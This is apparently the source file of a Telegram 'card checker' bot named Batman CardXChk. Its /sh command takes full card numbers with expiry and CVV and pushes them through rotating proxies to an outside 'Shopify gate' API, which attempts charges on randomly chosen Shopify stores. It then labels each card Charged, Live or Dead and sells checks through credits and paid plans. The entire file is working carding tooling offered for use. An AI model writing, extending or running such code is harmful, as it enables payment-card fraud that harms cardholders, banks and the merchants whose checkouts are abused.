import aiohttp
import asyncio
import time
import random
from html import escape
from telegram import Update, LinkPreviewOptions, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import (
    get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT,
    CHANNEL_LINK, DEV_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GOSHOPI SHOPIFY GATE  — goshopi.up.railway.app/shopii
# Sites: sites.txt | Proxies: px.txt
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

GOSHOPI_URL   = "https://goshopi.up.railway.app/shopii"
FALLBACK_SITE = "aloracosmetics.myshopify.com"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BOT IDENTITY — Batman CardXChk
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BOT_CHANNEL   = "https://t.me/Batcardchk"
BOT_NAME      = "Batamanchk"
DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FULL EMOJI IDs — merged from msh.py + mst.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Core result emojis (msh.py)
LIVE_EMOJI_ID          = "4958610528588008305"
DECLINED_EMOJI_ID_SH   = "4956612582816351459"
CARD_EMOJI_ID_SH       = "5800709991627232190"
USER_EMOJI_ID_SH       = "4958689671950369798"
TIME_EMOJI_ID_SH       = "5382194935057372936"
DEV_EMOJI_ID_SH        = "6267091732861555879"
PRO_EMOJI_ID_SH        = "6298678524379137990"

# Hit-log emojis (msh.py)
HIT_GATE_EMOJI_ID      = "5341715473882955310"
HIT_RESP_EMOJI_ID      = "5839116473951328489"

# Progress-message emojis (msh.py)
PROG_GATE_EMOJI_ID         = "5341715473882955310"
PROG_PROGRESS_EMOJI_ID_SH  = "5258113901106580375"
PROG_CHARGED_EMOJI_ID      = "5427168083074628963"
PROG_LIVE_EMOJI_ID_SH      = "6267225207560214192"
PROG_DEAD_EMOJI_ID_SH      = "4958526153955476488"
PROG_ERRORS_EMOJI_ID       = "4956611513369494230"

# Button emojis (msh.py + mst.py)
GATE_EMOJI_ID          = "5801044672658805468"
BTN_LIVE_EMOJI_ID      = "5039793437776282663"
BTN_DEAD_EMOJI_ID      = "4956612582816351459"
BTN_CHARGED_EMOJI_ID   = "5465465194056525619"
BTN_ALL_EMOJI_ID       = "4956324463525233747"
BTN_STOP_EMOJI_ID      = "6179444193518162239"
CARD_CHK_BTN_EMOJI_ID  = "5935795874251674052"

# Pool of charged emoji IDs — random per CHARGED hit (msh.py)
CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# Pool of live emoji IDs — random per LIVE hit (mst.py)
LIVE_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PLAN EMOJIS — from msh.py + mst.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PLAN_EMOJIS = {
    "CORE":   "5379869575338812919",
    "ELITE":  "5836898273666798437",
    "ROOT":   "4956420911310832630",
    "CUSTOM": "5445027583588593750",
}

SPECIAL_FONT_MAP = {
    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
    'ᴢ': 'Z', 'Ɪ': 'I',
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPER FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_random_charged_emoji() -> str:
    return random.choice(CHARGED_EMOJI_IDS)

def get_random_live_emoji() -> str:
    return random.choice(LIVE_EMOJI_IDS)

def get_plan_emoji_id(plan_name: str) -> str:
    """Return tg-emoji ID for the user's plan (from msh.py + mst.py)."""
    if not plan_name:
        return PRO_EMOJI_ID_SH
    normalized = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
    if normalized in PLAN_EMOJIS:
        return PLAN_EMOJIS[normalized]
    for key, eid in PLAN_EMOJIS.items():
        if key in normalized:
            return eid
    return PRO_EMOJI_ID_SH

def build_user_link(user) -> str:
    """HTML link to user profile (from mst.py)."""
    name = escape(user.first_name or "User")
    if user.username:
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def fmt_time(seconds: float) -> str:
    s = int(seconds)
    return f"{s // 60}m {s % 60}s" if s >= 60 else f"{s}s"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE / PROXY LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def load_sites() -> list:
    try:
        with open("sites.txt", "r") as f:
            sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return sites if sites else [f"https://{FALLBACK_SITE}"]
    except FileNotFoundError:
        return [f"https://{FALLBACK_SITE}"]

def load_proxies() -> list:
    """Load proxies — proxies.txt first, px.txt as fallback."""
    for fname in ("proxies.txt", "px.txt"):
        try:
            with open(fname, "r") as f:
                px = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            if px:
                return px
        except FileNotFoundError:
            continue
    return []

def _clean_site(url: str) -> str:
    s = url.strip()
    for prefix in ("https://", "http://"):
        if s.startswith(prefix):
            s = s[len(prefix):]
    if s.startswith("www."):
        s = s[4:]
    return s.rstrip("/")

def _readable_resp(data: dict) -> str:
    for key in ("Response", "response", "value", "message", "category", "status", "detail", "error"):
        val = data.get(key)
        if val and str(val).strip() not in ("", "null", "None"):
            return str(val).strip()
    raw = str(data)
    return raw[:200] if len(raw) > 200 else raw

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION — synced from msh.py (1784626205918)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Shopify site/proxy/delivery errors — credit refunded, gate shown as Shopify 0-20$
RETRY_ERRORS = [
    # ── Core gate errors (msh.py) ─────────────────────────────────
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!', 'VALIDATION_CUSTOM',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed',
    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'could not resolve host',
    'connect tunnel failed', 'timeout', 'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'SESSION_ERROR',
    # ── Delivery strategy errors — Gate shows Shopify 0-20$ (not Error)
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'DELIVERY_ZONE_NOT_FOUND',
    'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'no available delivery strategy found',
    'no available delivery strategy',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    # ── Receipt / product errors ───────────────────────────────────
    'no available products found', 'could not extract receiptid',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'could not extract signedhandles', 'receiptid missing',
    'response missing receiptid', 'INVENTORY_FAILURE',
    'products.json', 'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',
    'store incompatible', 'extract signedHandles', 'missing receiptId',
    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
    # ── Stripe / mass gate errors (mst.py) ────────────────────────
    'connection timed out', 'connection failed', 'unexpected error',
    'api error (http', 'api error', 'api timeout',
    'connection reset', 'network error',
]

# Hard declines — card is dead, credit deducted
DECLINED_RESPONSES = [
    # ── Shopify declines (msh.py) ─────────────────────────────────
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED',
    # ── Stripe declines (mst.py) ──────────────────────────────────
    'declined', 'card_declined', 'do_not_honor', 'insufficient_funds_declined',
    'lost_card', 'stolen_card', 'expired_card', 'incorrect_cvc',
    'processing_error', 'fraudulent', 'pickup_card', 'restricted_card',
    'security_violation', 'service_not_allowed', 'transaction_not_allowed',
    'try_again_later', 'withdrawal_count_limit_exceeded',
]

def classify_response(message: str) -> str:
    """
    Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR

    Synced from msh.py (1784626205918) + mst.py:
    ─ CHARGED : ORDER_PAID / CHARGED  → Gate ➳ Shopify | <price> <currency>
    ─ TDS     : 3DS_REQUIRED           → Live [3DS], Gate ➳ Shopify 0-20$
    ─ LIVE    : INSUFFICIENT_FUNDS / INCORRECT_CVV/CVC/ZIP → Gate ➳ Shopify 0-20$
    ─ DEAD    : Hard decline keyword   → Gate ➳ Shopify 0-20$
    ─ RETRY   : Site/proxy/delivery errors → credit refunded, Gate ➳ Shopify 0-20$
    ─ ERROR   : Anything else          → credit refunded, Gate ➳ Shopify 0-20$
    """
    mu = message.upper()
    ml = message.lower()

    # Charged / order paid (highest priority)
    # "CAPTURED" added from uploaded gate source — some APIs return "captured" for successful charge
    if "ORDER_PAID" in mu or "CHARGED" in mu or "CAPTURED" in mu:
        return "CHARGED"

    # 3DS challenge — counts as Live, tracked separately
    # "3D SECURE" (with space) and "3d secure" added from uploaded gate source
    if "3DS_REQUIRED" in mu or "3D_SECURE" in mu or "3D SECURE" in mu:
        return "TDS"

    # Live: strong evidence card is valid but blocked / insufficient
    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
        return "LIVE"

    # Stripe "approved"
    if mu.strip() == "APPROVED" or "APPROVED" in mu:
        return "LIVE"

    if "GENERIC_ERROR" in mu:
        return "DEAD"

    # Hard declines → DEAD
    if any(d.upper() in mu for d in DECLINED_RESPONSES):
        return "DEAD"

    # Site / proxy / delivery errors → RETRY (credit refunded)
    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    # Stripe "error" / "timeout" status → RETRY
    if mu.strip() in ("ERROR", "TIMEOUT"):
        return "RETRY"

    return "ERROR"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def call_shopii(
    session: aiohttp.ClientSession, card: str, site: str, proxy: str | None
) -> dict:
    params: dict = {"cc": card, "site": site}
    if proxy:
        params["proxy"] = proxy
    try:
        async with session.get(
            GOSHOPI_URL, params=params,
            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT)
        ) as resp:
            try:
                return await resp.json(content_type=None)
            except Exception:
                raw = await resp.text()
                return {"Response": raw, "_raw_text": True}
    except asyncio.TimeoutError:
        raise
    except Exception as e:
        return {"Response": f"CONNECTION_ERROR: {e}", "_error": True}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT MESSAGE BUILDER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Layout:
#   [❆] Charged 💎          ← clickable [❆] link
#
#   💳
#      ⤷ 4848...|04|28|504  ← monospace
#   Gate ➳ Shopify | 2.1 USD  ← CHARGED shows real price
#   ──────────
#   Resp ➳ ORDER_PAID
#   Bin  ➳ VISA - BANK - 🇲🇾 MALAYSIA  ← monospace
#   ──────────
#   ⏱ ➳ 13s
#   👤 ➳ Tom ⭐
#   ⚡ ➳ Batamanchk ⭐
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _build_result_msg(
    card_raw: str, resp_text: str, verdict: str,
    bin_txt: str, api_price: str, api_currency: str,
    elapsed: float, user, plan: str,
) -> str:
    plan_emoji_id = get_plan_emoji_id(plan)
    user_link     = build_user_link(user)
    time_str      = fmt_time(elapsed)
    safe_card     = escape(card_raw)
    safe_resp     = escape(resp_text)
    safe_bin      = escape(bin_txt)
    safe_price    = escape(api_price)
    safe_cur      = escape(api_currency)

    # ── Status line + gate line per verdict ─────────────────────
    if verdict == "CHARGED":
        charged_eid = get_random_charged_emoji()
        status_line = (
            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Charged '
            f'<tg-emoji emoji-id="{charged_eid}">💎</tg-emoji></b>'
        )
        gate_line = f'<b>Gate ➳ Shopify | {safe_price} {safe_cur}</b>'

    elif verdict == "TDS":
        live_eid    = get_random_live_emoji()
        status_line = (
            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Live '
            f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji> [3DS]</b>'
        )
        gate_line = '<b>Gate ➳ Shopify 0-20$</b>'

    elif verdict == "LIVE":
        live_eid    = get_random_live_emoji()
        status_line = (
            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Live '
            f'<tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>'
        )
        gate_line = '<b>Gate ➳ Shopify 0-20$</b>'

    elif verdict == "DEAD":
        status_line = (
            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Dead '
            f'<tg-emoji emoji-id="{DECLINED_EMOJI_ID_SH}">❌</tg-emoji></b>'
        )
        gate_line = '<b>Gate ➳ Shopify 0-20$</b>'

    elif verdict == "RETRY":
        # Site/proxy/delivery errors — Gate still shown as Shopify 0-20$
        status_line = (
            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Retry '
            f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>'
        )
        gate_line = '<b>Gate ➳ Shopify 0-20$</b>'

    else:  # ERROR
        status_line = (
            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Error '
            f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>'
        )
        gate_line = '<b>Gate ➳ Shopify 0-20$</b>'

    return (
        f'{status_line}\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID_SH}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{safe_card}</code></b>\n'
        f'{gate_line}\n'
        f'<b>──────────</b>\n'
        f'<b>Resp ➳ {safe_resp}</b>\n'
        f'<b>Bin  ➳ <code>{safe_bin}</code></b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID_SH}">⏱</tg-emoji> ➳ {time_str}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID_SH}">👤</tg-emoji> ➳ {user_link} '
        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID_SH}">⚡</tg-emoji> ➳ {DEV_LINK_HTML} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID_SH}">⭐</tg-emoji></b>'
    )


def _build_timeout_msg(card_raw: str, elapsed: float) -> str:
    return (
        f'<b><a href="{BOT_CHANNEL}">[❆]</a> Timeout '
        f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⏱</tg-emoji></b>\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID_SH}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{escape(card_raw)}</code></b>\n'
        f'<b>Gate ➳ Shopify 0-20$</b>\n'
        f'<b>──────────</b>\n'
        f'<b>Resp ➳ Request Timed Out</b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID_SH}">⏱</tg-emoji> ➳ {fmt_time(elapsed)}</b>'
    )


def _build_error_msg(card_raw: str, err: str, elapsed: float) -> str:
    return (
        f'<b><a href="{BOT_CHANNEL}">[❆]</a> Error '
        f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID_SH}">💳</tg-emoji></b>\n'
        f'<b>   ⤷ <code>{escape(card_raw)}</code></b>\n'
        f'<b>Gate ➳ Shopify 0-20$</b>\n'
        f'<b>──────────</b>\n'
        f'<b>Resp ➳ {escape(err[:150])}</b>\n'
        f'<b>──────────</b>\n'
        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID_SH}">⏱</tg-emoji> ➳ {fmt_time(elapsed)}</b>'
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PLAN HELPERS  (local — avoids circular import with main)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150, "plan": "TRIAL", "expires": 0,
            "pre_premium_credits": 0,
        }
    return context.bot_data["user_data"][uid]


def _is_premium(ud: dict) -> bool:
    plan = ud.get("plan", "TRIAL").upper()
    if plan == "TRIAL":
        return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"
        ud["credits"] = ud.get("pre_premium_credits", 150)
        ud["expires"] = 0
        return False
    return True


async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked", "restricted"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACK BUTTON
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _kb_with_back(premium: bool) -> InlineKeyboardMarkup:
    try:
        base_kb = kb_result(premium)
        rows    = list(base_kb.inline_keyboard) if hasattr(base_kb, "inline_keyboard") else []
    except Exception:
        rows = []
    rows.append([
        InlineKeyboardButton(
            "❌ 𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆",
            url=BOT_CHANNEL,
        )
    ])
    return InlineKeyboardMarkup(rows)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # ── Maintenance / gate off ──────────────────────────
    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text(
            "⚠️ Bot is under maintenance. Try again later.", parse_mode="HTML"
        )
        return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "⚠️ <b>Shopify gate is currently OFF.</b>", parse_mode="HTML"
        )
        return

    # ── Force-sub check ─────────────────────────────────
    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>Join Required</b>\n──────────\nJoin our channel & group to use this bot.",
            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML"
        )
        return

    # ── Parse card ──────────────────────────────────────
    card_raw = None
    if context.args:
        card_raw = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt:
            card_raw = txt.split()[0]

    if not card_raw or card_raw.count("|") < 3:
        await update.message.reply_text(
            f"<b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>\n"
            f"<b>Example:</b> <code>/sh 4111111111111111|12|2026|123</code>",
            parse_mode="HTML"
        )
        return

    # ── Credits / cooldown ──────────────────────────────
    ud      = _get_user_data(user.id, context)
    premium = _is_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>❌ No Credits</b>\n──────────\nYou have 0 credits left.\n"
                "Use /rm to redeem a code or /plan to upgrade.\n──────────",
                parse_mode="HTML"
            )
            return

        cooldown_store = context.bot_data.setdefault("cooldown_store", {})
        last_check     = cooldown_store.get(user.id, 0)
        remaining      = 25 - (time.time() - last_check)
        if remaining > 0:
            await update.message.reply_text(
                f"<b>⏳ Cooldown</b>\n──────────\n"
                f"Wait <b>{remaining:.1f}s</b> before your next check.\n──────────",
                parse_mode="HTML"
            )
            return
        cooldown_store[user.id] = time.time()
        ud["credits"] = ud.get("credits", 1) - 1

    # ── Pick site and proxy ─────────────────────────────
    sites      = load_sites()
    proxies    = load_proxies()
    raw_site   = random.choice(sites)
    clean_site = _clean_site(raw_site)
    proxy      = random.choice(proxies) if proxies else None

    bin_num = card_raw.replace("|", "").replace(" ", "")[:6]
    plan    = ud.get("plan", "TRIAL")
    _lp     = LinkPreviewOptions(is_disabled=True)

    # ── "Checking" spinner — gate name shown immediately ─
    msg = await update.message.reply_text(
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID_SH}">🔄</tg-emoji> '
        f'Checking — Gate ➳ Shopify 0-20$...</b>',
        parse_mode="HTML"
    )
    start_time = time.time()

    try:
        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            data, bin_data = await asyncio.gather(
                call_shopii(session, card_raw, clean_site, proxy),
                get_bin_info(bin_num),
                return_exceptions=True,
            )

        if isinstance(data, BaseException):
            raise data
        if isinstance(bin_data, BaseException):
            bin_data = {}

        if not isinstance(data, dict):
            data = {}

        resp_text    = _readable_resp(data)
        api_price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
        api_currency = str(data.get("Currency", data.get("currency", "USD"))).strip()

        verdict = classify_response(resp_text)

        # ── BIN info line ───────────────────────────────
        bin_txt = "N/A"
        if isinstance(bin_data, dict) and bin_data:
            scheme  = str(bin_data.get("scheme",  "N/A")).upper()
            bank    = bin_data.get("bank",    "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag    = bin_data.get("country_emoji", "")
            bin_txt = f"{scheme} - {bank} - {flag} {country}".strip(" -")

        elapsed = time.time() - start_time

        # ── Credit accounting ───────────────────────────
        if verdict in ("CHARGED", "TDS", "LIVE"):
            ud["approved_checks"] = ud.get("approved_checks", 0) + 1
        elif verdict in ("RETRY", "ERROR"):
            if not premium:
                ud["credits"] = ud.get("credits", 0) + 1   # refund
            ud["declined_checks"] = ud.get("declined_checks", 0) + 1
        else:  # DEAD
            ud["declined_checks"] = ud.get("declined_checks", 0) + 1

        ud["total_checks"] = ud.get("total_checks", 0) + 1
        ud["last_gate"]    = "Shopify 0-20$"
        ud["last_card"]    = card_raw[:6] + "xxxxxxxxxx"

        text = _build_result_msg(
            card_raw, resp_text, verdict, bin_txt,
            api_price, api_currency, elapsed, user, plan,
        )

        await msg.edit_text(
            text, parse_mode="HTML",
            reply_markup=kb_result(premium),
            link_preview_options=_lp,
        )

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        elapsed = time.time() - start_time
        await msg.edit_text(
            _build_timeout_msg(card_raw, elapsed),
            parse_mode="HTML",
            reply_markup=kb_result(premium),
            link_preview_options=_lp,
        )

    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        elapsed = time.time() - start_time
        await msg.edit_text(
            _build_error_msg(card_raw, str(e), elapsed),
            parse_mode="HTML",
            reply_markup=kb_result(premium),
            link_preview_options=_lp,
        )


def get_sh_handler() -> CommandHandler:
    return CommandHandler("sh", cmd_sh)
